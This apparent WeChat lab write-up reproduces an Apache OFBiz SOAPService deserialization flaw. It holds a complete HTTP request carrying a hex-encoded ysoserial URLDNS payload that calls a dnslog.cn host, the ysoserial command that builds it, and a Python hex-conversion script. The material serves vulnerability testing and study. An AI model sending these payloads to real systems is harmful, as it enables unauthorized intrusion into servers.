<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xq-erT8qFmbDJIDLWL65ig)

**0x01 前言**

Apache OFBiz 是一个电子商务平台，用于构建大中型企业级、跨平台、跨数据库、跨应用服务器的多层、分布式电子商务类应用系统。

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGqqyZAj4DX1V7Z9nswbiaU5UCujjaUic5M9TS6CesYISaK1eicicbtYH4Bbh3MfDByKkJuw9fnQmMufg/640?wx_fmt=png)

有需要的朋友后台回复关键字 "**26295**" 可获取相关工具

**推荐个不错的文库**![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGqqyZAj4DX1V7Z9nswbiaU5MC5zEn2K4LpEuY2WjKMqrd4S3s41BdQq1I7wUfaPB7jsa0XbFRD7Bg/640?wx_fmt=png)  

**_http://wiki.peiqi.tech_**  

**0x02 影响版本**

```
apache:ofbiz: <17.12.06
```

**0x03 环境搭建**

这里利用 docker 搭建（主要是方便）

```
docker run -d -p 811:8080 -p 8443:8443  opensourceknight/ofbiz
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGqqyZAj4DX1V7Z9nswbiaU5b5y9xIicveESiaRR7mWNVKAkn5zrmpD8cy2u5Gzk1icORg3pMHF4Y9Kvg/640?wx_fmt=png)

**0x04 漏洞复现**

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGqqyZAj4DX1V7Z9nswbiaU5ibcDmLfARwwaj0Pia68hGrzE5IrN9Thiaed7ASowrgI9WldbaWEUGwiavw/640?wx_fmt=png)

**构造数据包：**  

```
POST /webtools/control/SOAPService HTTP/1.1
Host: 192.168.46.139:8443
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0
Content-Length: 1007
Accept: */*
Content-Type: application/xml
Origin: chrome-extension://ieoejemkppmjcdfbnfphhpbfmallhfnc
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie:
Connection: close

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
<soapenv:Header/>
<soapenv:Body>
<ser>
    <map-HashMap>
        <map-Entry>
            <map-Key>
                <cus-obj>aced0005737200116a6176612e7574696c2e486173684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573686f6c6478703f4000000000000c770800000010000000017372000c6a6176612e6e65742e55524c962537361afce47203000749000868617368436f6465490004706f72744c0009617574686f726974797400124c6a6176612f6c616e672f537472696e673b4c000466696c6571007e00034c0004686f737471007e00034c000870726f746f636f6c71007e00034c000372656671007e00037870ffffffffffffffff74001037637a3035792e646e736c6f672e636e74000071007e0005740004687474707078740017687474703a2f2f37637a3035792e646e736c6f672e636e78</cus-obj>
            </map-Key>
            <map-Value>
                <std-String value="http://www.dnslog.cn"/>
            </map-Value>
        </map-Entry>
    </map-HashMap>
</ser>
</soapenv:Body>
</soapenv:Envelope>
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGqqyZAj4DX1V7Z9nswbiaU5iaooraiadkbBSrXYAHAcwQJRF3e6v8MiaKhArhoMk1SGCgtahoiafZfgtQ/640?wx_fmt=png)

Q：<cus-obj> 的一串是怎么来的？

A：那个串是用 ysoserial 的 URLDNS 利用链生成的，命令如下：

```
java -jar ysoserial.jar URLDNS http://7cz05y.dnslog.cn > 11.ot
```

再利用脚本将生成的 11.ot 解码转换成 hex 如下：

```
import binascii

filename = '11.ot'
with open(filename, 'rb') as f:
    content = f.read()
print(binascii.hexlify(content))
```

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGqqyZAj4DX1V7Z9nswbiaU5mUYXT7I5FwNekDsEl2ztkAntibdjm5tzut8OmxeuSHo3C133qohmQRw/640?wx_fmt=png)

将解码后的内容放到数据包中执行

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGqqyZAj4DX1V7Z9nswbiaU5ibiag3SkfDDqOwIMboTaVyicdzwYx9EjW3a02IOoxPq6DQZiabE6rBeaoQ/640?wx_fmt=png)  

DNSLOG 平台收到响应  

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGqqyZAj4DX1V7Z9nswbiaU5ib4Ricict7SiafLAqicZae9mCibTYLT01PDTjXRWYpC0nf1NYTjbQUH0mticA/640?wx_fmt=png)

利用 PeiQi 师傅的脚本验证一波  

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTGqqyZAj4DX1V7Z9nswbiaU5rDqHtkia7IxRfLJo645qlib4q1MS0kvm3vyA48mXRHaYV1dhokf9QrZA/640?wx_fmt=png)

**0x05 参考链接**

```
https://mp.weixin.qq.com/s/XT2P6vB8e2pDp3_Dulfzhw
```

**【往期推荐】**  

[【内网渗透】内网信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485796&idx=1&sn=8e78cb0c7779307b1ae4bd1aac47c1f1&chksm=ea37f63edd407f2838e730cd958be213f995b7020ce1c5f96109216d52fa4c86780f3f34c194&scene=21#wechat_redirect)  

[【内网渗透】域内信息收集命令汇总](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485855&idx=1&sn=3730e1a1e851b299537db7f49050d483&chksm=ea37f6c5dd407fd353d848cbc5da09beee11bc41fb3482cc01d22cbc0bec7032a5e493a6bed7&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - Shellcode Loader 原理 (python)](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486582&idx=1&sn=572fbe4a921366c009365c4a37f52836&chksm=ea37f32cdd407a3aea2d4c100fdc0a9941b78b3c5d6f46ba6f71e946f2c82b5118bf1829d2dc&scene=21#wechat_redirect)

[【超详细 | Python】CS 免杀 - 分离 + 混淆免杀思路](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486638&idx=1&sn=99ce07c365acec41b6c8da07692ffca9&chksm=ea37f3f4dd407ae28611d23b31c39ff1c8bc79762bfe2535f12d1b9d7a6991777b178a89b308&scene=21#wechat_redirect)  

[【超详细】CVE-2020-14882 | Weblogic 未授权命令执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485550&idx=1&sn=921b100fd0a7cc183e92a5d3dd07185e&chksm=ea37f734dd407e22cfee57538d53a2d3f2ebb00014c8027d0b7b80591bcf30bc5647bfaf42f8&scene=21#wechat_redirect)

[【超详细 | 附 PoC】CVE-2021-2109 | Weblogic Server 远程代码执行漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247486517&idx=1&sn=34d494bd453a9472d2b2ebf42dc7e21b&chksm=ea37f36fdd407a7977b19d7fdd74acd44862517aac91dd51a28b8debe492d54f53b6bee07aa8&scene=21#wechat_redirect)  

[【奇淫巧技】如何成为一个合格的 “FOFA” 工程师](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485135&idx=1&sn=f872054b31429e244a6e56385698404a&chksm=ea37f995dd40708367700fc53cca4ce8cb490bc1fe23dd1f167d86c0d2014a0c03005af99b89&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[记一次 HW 实战笔记 | 艰难的提权爬坑](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=2&sn=5368b636aed77ce455a1e095c63651e4&chksm=ea37f965dd407073edbf27256c022645fe2c0bf8b57b38a6000e5aeb75733e10815a4028eb03&scene=21#wechat_redirect)

[【超详细】Microsoft Exchange 远程代码执行漏洞复现【CVE-2020-17144】](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247485992&idx=1&sn=18741504243d11833aae7791f1acda25&chksm=ea37f572dd407c64894777bdf77e07bdfbb3ada0639ff3a19e9717e70f96b300ab437a8ed254&scene=21#wechat_redirect)

[【超详细】Fastjson1.2.24 反序列化漏洞复现](http://mp.weixin.qq.com/s?__biz=MzI1NTM4ODIxMw==&mid=2247484991&idx=1&sn=1178e571dcb60adb67f00e3837da69a3&chksm=ea37f965dd4070732b9bbfa2fe51a5fe9030e116983a84cd10657aec7a310b01090512439079&scene=21#wechat_redirect)

_**走过路过的大佬们留个关注再走呗**_![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTEATexewVNVf8bbPg7wC3a3KR1oG1rokLzsfV9vUiaQK2nGDIbALKibe5yauhc4oxnzPXRp9cFsAg4Q/640?wx_fmt=png)

**往期文章有彩蛋哦****![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTHtVfEjbedItbDdJTEQ3F7vY8yuszc8WLjN9RmkgOG0Jp7QAfTxBMWU8Xe4Rlu2M7WjY0xea012OQ/640?wx_fmt=png)**

![](https://mmbiz.qpic.cn/mmbiz_png/7D2JPvxqDTECbvcv6VpkwD7BV8iaiaWcXbahhsa7k8bo1PKkLXXGlsyC6CbAmE3hhSBW5dG65xYuMmR7PQWoLSFA/640?wx_fmt=png)